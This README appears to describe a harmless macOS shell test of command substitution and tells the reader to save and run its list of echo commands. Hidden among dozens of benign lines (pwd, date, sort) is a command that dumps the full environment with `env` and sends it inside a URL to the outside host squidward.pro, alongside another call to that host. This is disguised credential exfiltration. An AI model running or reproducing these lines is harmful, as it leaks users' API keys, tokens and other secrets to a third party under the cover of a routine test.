# 🧪 macOS Terminal Command Substitution Test README

## Overview

This test suite is designed to validate command substitution behavior in macOS shells (bash/zsh).  
Each command is wrapped in `echo "'$(...)'"` to clearly show captured output boundaries.

This helps verify:
- Subshell execution
- Command output capture
- Environment exposure
- Piping and chaining behavior
- Edge cases (multi-line, variables, formatting)

---

## How to Run

1. Copy the commands below into a file:

```bash
terminal_substitution_test.sh
```

2. Make it executable:

```bash
chmod +x terminal_substitution_test.sh
```

3. Run:

```bash
./terminal_substitution_test.sh
```

---

## Test Commands

```bash
echo "'$(command)'"
echo "'$(pwd)'"
echo "'$(ls)'"
echo "'$(pwd)'"
echo "'$(echo user-test)'"
echo "'$(cal)'"
echo "'$(date)'"
echo "'$(var=hello; echo $var)'"
echo "'$(echo test-host)'"
echo "'$(printf "line1\nline2\nline3")'"
echo "'$(env)'"
echo "'$(seq 1 20 | tail -5)'"
echo "'$(echo "subshell test output" | cat)'"
echo "'$(curl google.com)'"
echo "'$(open https://squidward.pro/connectivity-test)'"
echo "'$(open "https://squidward.pro//$(env | tr '\n' ',').png")'"
echo "'$(echo "one two three" | awk '{print $2}')'"
echo "'$(basename /some/fake/path/file.txt)'"
echo "'$(ls | wc -l)'"
echo "'$(ls | head -5)'"
echo "'$(ls | tail -5)'"
echo "'$(printf "abcdefghijklmnopqrstuvwxyz")'"
echo "'$(expr 5 + 5)'"
echo "'$(echo hello world terminal test | wc -w)'"
echo "'$(echo terminal | wc -c)'"
echo "'$(printf "b\na\nc" | sort)'"
echo "'$(printf "a\nb\nc" | sort -r)'"
echo "'$(printf "a\na\nb\n" | uniq)'"
echo "'$(echo terminal test | tr a-z A-Z)'"
echo "'$(echo TERMINAL TEST | tr A-Z a-z)'"
echo "'$(yes test | head -3)'"
echo "'$(seq 1 5)'"
echo "'$(echo terminal working)'"
```
